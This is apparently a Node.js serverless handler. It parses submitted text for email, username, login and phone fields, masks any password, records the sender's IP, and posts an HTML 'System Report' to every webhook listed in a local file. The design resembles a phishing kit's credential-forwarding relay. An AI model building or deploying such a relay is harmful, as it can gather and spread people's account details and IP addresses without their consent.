const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   SAFE BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACT VARS (FULL SUPPORT)
   - key:value
   - HTML table <td>
====================== */
function extractVars(input = "") {
  const vars = {};
  const raw = String(input);

  // ======================
  // 1. REMOVE SCRIPT/STYLE
  // ======================
  const cleanedText = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "");

  // ======================
  // 2. PARSE key:value FORMAT
  // ======================
  const kvRegex = /(\b\w+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(cleanedText)) !== null) {
    const key = m[1].toLowerCase().trim();
    const value = m[2].trim();

    mapKey(vars, key, value);
  }

  // ======================
  // 3. PARSE HTML TABLE
  // ======================
  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    const keyRaw = t[1].toLowerCase().replace(/[^a-z]/gi, "");
    const value = t[2].trim();

    mapKey(vars, keyRaw, value);
  }

  return vars;
}

/* ======================
   MAP KEY SAFE
====================== */
function mapKey(vars, key, value) {
  if (!value) return;

  if (key.includes("email")) vars.email = value;
  else if (key.includes("user")) vars.user = value;
  else if (key.includes("login")) vars.login = value;
  else if (key.includes("phone")) vars.phone = value;
  else if (key.includes("pass")) vars.password = "***";
}

/* ======================
   GET IP
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "unknown"
  );
}

/* ======================
   BUILD HTML REPORT
====================== */
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="font-family:Arial;background:#fff;padding:20px">

<h2>System Report</h2>

<table border="1" cellpadding="8" style="border-collapse:collapse;width:100%">

<tr><td>Email</td><td>${vars.email || "-"}</td></tr>
<tr><td>User</td><td>${vars.user || "-"}</td></tr>
<tr><td>Login</td><td>${vars.login || "-"}</td></tr>
<tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
<tr><td>Password</td><td>${vars.password || "-"}</td></tr>
<tr><td>IP</td><td>${vars.ip || "-"}</td></tr>

</table>

</body>
</html>
`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    // EXTRACT DATA
    const vars = extractVars(pesan);
    vars.ip = getIP(req);

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }

    // SEND TO ALL WEBHOOKS
    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
